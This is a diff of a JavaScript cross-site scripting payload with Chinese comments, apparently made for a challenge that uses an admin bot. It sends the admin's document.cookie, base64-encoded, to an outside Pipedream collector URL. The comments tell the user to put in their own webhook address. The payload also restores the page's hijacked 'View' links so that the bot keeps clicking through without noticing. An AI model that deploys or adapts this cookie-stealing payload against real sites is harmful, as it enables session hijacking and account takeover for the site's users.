@@ -1,12 +1,11 @@
-// 1. 偷 Cookie (核心攻擊)
+// 1. 偷取 Admin 的 Cookie 並傳送到你的接收端
+// 請將網址換成你的 Pipedream 或 Webhook 網址
 fetch('https://eos82zp0nc2qmhz.m.pipedream.net/?c=' + btoa(document.cookie));
 
-// 2. 還原原本的 View 功能，讓 Admin 機器人能點進去
+// 2. 核心：還原網頁原本的 "View" 功能
+// 因為我們劫持了 js，原本的跳轉功能會失效，如果不寫這段，Admin 機器人可能無法點進去
 document.querySelectorAll('.view').forEach((e) => {
     e.addEventListener('click', () => {
-        // 強制跳轉到詳細頁面（例如 /comment/875）
         window.location = `/comment/${e.id}`;
     });
 });
-
-console.log("Payload loaded and original View function restored.");
